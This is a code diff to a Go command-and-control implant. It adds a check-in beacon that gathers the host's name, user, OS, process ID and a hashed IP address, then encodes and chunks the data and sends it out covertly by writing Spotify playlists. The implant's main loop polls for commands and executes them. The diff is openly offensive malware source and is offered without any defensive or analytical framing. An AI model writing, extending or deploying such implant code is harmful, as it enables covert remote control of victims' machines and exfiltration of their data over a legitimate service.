@@ -2,8 +2,13 @@ package c2
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
+	"hash/adler32"
 	"math/rand"
+	"net"
+	"os"
+	"runtime"
 	"strings"
 	"time"
 
@@ -31,9 +36,69 @@ func NewImplant(client *spotify.Client, key string, interval, jitter int) *Impla
 	}
 }
 
+// getClientID returns Adler32 hash of primary IP as hex string.
+func getClientID() string {
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	ip := "127.0.0.1"
+	if err == nil {
+		ip = conn.LocalAddr().(*net.UDPAddr).IP.String()
+		conn.Close()
+	}
+	return fmt.Sprintf("%08x", adler32.Checksum([]byte(ip)))
+}
+
+// sendCheckin sends a check-in beacon so the operator knows we connected.
+func (imp *Implant) sendCheckin() {
+	ctx := context.Background()
+	clientID := getClientID()
+
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = "unknown"
+	}
+
+	checkinData := map[string]interface{}{
+		"client_id": clientID,
+		"ip_hash":   clientID,
+		"hostname":  hostname,
+		"os":        runtime.GOOS + "/" + runtime.GOARCH,
+		"user":      username,
+		"pid":       os.Getpid(),
+	}
+
+	dataBytes, _ := json.Marshal(checkinData)
+	result := &protocol.C2Message{
+		Module: "checkin",
+		Seq:    0,
+		Status: "ok",
+		Data:   string(dataBytes),
+	}
+
+	encoded, err := protocol.EncodeMessage(result.ToResultMap(), imp.key)
+	if err != nil {
+		fmt.Printf("[!] Checkin encode failed: %v\n", err)
+		return
+	}
+
+	chunks, err := protocol.ChunkPayload(encoded, 0,
+		protocol.ChannelRes, imp.key)
+	if err != nil {
+		fmt.Printf("[!] Checkin chunk failed: %v\n", err)
+		return
+	}
+
+	if err := imp.client.WriteC2Playlists(ctx, chunks); err != nil {
+		fmt.Printf("[!] Checkin send failed: %v\n", err)
+		return
+	}
+	fmt.Printf("[*] Check-in sent (client_id=%s)\n", clientID)
+}
+
 // Run starts the main polling loop.
 func (imp *Implant) Run() {
 	fmt.Println("[*] Implant started, polling for commands...")
+	imp.sendCheckin()
 
 	for {
 		imp.pollAndExecute()
